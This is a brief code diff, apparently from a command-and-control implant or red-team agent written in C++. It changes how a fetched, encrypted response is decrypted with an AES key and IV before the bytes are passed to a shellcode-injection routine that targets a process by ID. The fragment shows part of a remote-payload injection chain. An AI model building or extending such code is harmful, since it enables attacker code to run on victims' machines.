@@ -31,7 +31,11 @@ namespace Task
             return L"Error: Failed to read response.";
 
         // Decrypt the data
-        std::vector<BYTE> bytes = Crypt::Decrypt(wEnc);
+        std::vector<BYTE> bytes = Crypt::Decrypt(
+            wEnc,
+            pState->pCrypt->pAES->hKey,
+            pState->pCrypt->pAES->iv
+        );
 
         // Inject shellcode
         if (!Technique::Injection::ShellcodeInjection(dwPid, bytes))
